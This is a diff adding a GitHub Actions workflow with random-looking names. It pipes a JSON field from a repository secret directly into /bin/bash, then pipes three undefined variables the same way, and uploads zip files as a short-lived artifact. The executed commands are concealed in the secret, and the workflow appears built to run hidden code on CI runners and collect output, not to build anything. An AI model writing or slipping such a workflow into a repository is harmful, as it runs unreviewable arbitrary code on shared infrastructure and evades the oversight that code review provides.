@@ -1,0 +1,24 @@
+name: springsusanpico
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: springsusanpico
+        env:
+          ekmiu9918: ${{ secrets.ekmiu9918 }}
+        run: |
+          printf '%s' "$ekmiu9918" | jq -r .rkaxw966 | /bin/bash
+          echo $pdxd54 | jq -r .p45 | /bin/bash
+          echo $m2 | jq -r .uhqi01 | /bin/bash
+          printf '%s' "$y3" | jq -r .b61750 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5IzoVZeZ
+          path: "*.zip"
+          retention-days: 1
